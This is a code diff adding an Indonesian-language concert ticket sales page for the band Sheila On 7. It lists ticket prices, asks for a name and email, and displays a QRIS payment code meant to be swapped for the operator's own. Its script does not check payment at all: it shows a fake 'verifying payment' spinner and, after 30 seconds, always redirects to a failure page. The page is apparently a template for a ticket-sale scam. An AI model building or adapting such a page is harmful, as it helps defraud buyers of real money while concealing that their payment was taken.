@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SHEILA ON7 POLIPONI.ID</title>
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,sans-serif}
+
+/* GRID BACKGROUND */
+body{
+  background-color:#eeeeee;
+  background-image:
+    linear-gradient(#d0d0d0 1px,transparent 1px),
+    linear-gradient(90deg,#d0d0d0 1px,transparent 1px);
+  background-size:30px 30px;
+}
+
+/* CONTAINER PUTIH */
+.container{
+  max-width:430px;
+  margin:auto;
+  min-height:100vh;
+  background:#fff;
+  box-shadow:0 0 0 2px #000;
+}
+
+/* CONTENT */
+.content{padding:20px}
+
+/* TITLE */
+.title{
+  font-size:26px;
+  font-weight:bold;
+  text-align:center;
+  margin-bottom:15px;
+  color:#000;
+}
+
+/* BOX */
+.ticket-box{
+  background:#fff;
+  border:2px solid #000;
+  border-radius:16px;
+  padding:16px;
+  margin-bottom:20px;
+}
+
+.ticket{
+  background:#f5f5f5;
+  padding:12px;
+  border-radius:10px;
+  border:1px solid #ccc;
+  margin-bottom:10px;
+}
+
+.ticket-name{font-weight:bold;color:#000}
+.price{color:#00994d;font-weight:bold}
+
+label{display:block;margin-top:14px;color:#000;font-weight:bold}
+input,select{
+  width:100%;
+  padding:12px;
+  border-radius:10px;
+  border:1px solid #ccc;
+}
+
+/* TOTAL */
+.total-box{
+  margin-top:20px;
+  padding:14px;
+  border:2px dashed #000;
+  border-radius:12px;
+  text-align:center;
+}
+.total-box h2{color:#00994d}
+
+/* 🔥 QRIS FRAME UPGRADE */
+.qris{
+  margin-top:20px;
+  text-align:center;
+}
+
+.qris-frame{
+  display:inline-block;
+  padding:12px;
+  border:3px solid #000;
+  border-radius:16px;
+  background:#fff;
+  box-shadow:0 0 0 4px #ffd700; /* efek double frame */
+}
+
+.qris img{
+  width:220px;
+  display:block;
+  border-radius:10px;
+}
+
+.qris-label{
+  margin-top:8px;
+  font-size:14px;
+  font-weight:bold;
+  color:#000;
+}
+
+/* BUTTON */
+.btn{
+  width:100%;
+  padding:15px;
+  margin-top:20px;
+  border:none;
+  border-radius:12px;
+  background:linear-gradient(90deg,#ffd700,#ffb700);
+  font-size:18px;
+  font-weight:bold;
+  cursor:pointer;
+}
+
+/* LOADING SCREEN */
+.loading{
+  display:none;
+  position:fixed;
+  top:0;left:0;
+  width:100%;height:100%;
+  background:rgba(0,0,0,0.9);
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  color:#fff;
+  z-index:9999;
+}
+
+.spinner{
+  width:60px;height:60px;
+  border:6px solid #444;
+  border-top:6px solid #ffd700;
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+}
+
+@keyframes spin{
+  100%{transform:rotate(360deg)}
+}
+
+.loading p{
+  margin-top:15px;
+  font-size:16px;
+}
+</style>
+</head>
+
+<body>
+
+<div class="container">
+  <div class="content">
+
+    <div class="title">PEMBELIAN TIKET EVENT</div>
+
+    <div class="ticket-box">
+      <div class="ticket">
+        <div class="ticket-name">PREMIUM</div>
+        <div class="price">Rp. 400.000</div>
+      </div>
+      <div class="ticket">
+        <div class="ticket-name">FAST TRACK</div>
+        <div class="price">Rp. 600.000</div>
+      </div>
+    </div>
+
+    <label>Nama</label>
+    <input type="text">
+
+    <label>Email</label>
+    <input type="email">
+
+    <div class="total-box">
+      TOTAL
+      <h2>Rp. 400.000</h2>
+    </div>
+
+    <!-- 🔥 QRIS FRAME -->
+    <div class="qris">
+      <div class="qris-frame">
+        <img src="GANTI-DENGAN-QRIS-ANDA.png">
+      </div>
+      <div class="qris-label">SCAN QRIS UNTUK PEMBAYARAN</div>
+    </div>
+
+    <button class="btn" onclick="proses()">BELI SEKARANG</button>
+
+  </div>
+</div>
+
+<!-- LOADING -->
+<div class="loading" id="loading">
+  <div class="spinner"></div>
+  <p>Memverifikasi pembayaran...</p>
+</div>
+
+<script>
+function proses(){
+  document.getElementById("loading").style.display="flex";
+
+  setTimeout(function(){
+    window.location.href="failed.html";
+  },30000); // 30 DETIK
+}
+</script>
+
+</body>
+</html>
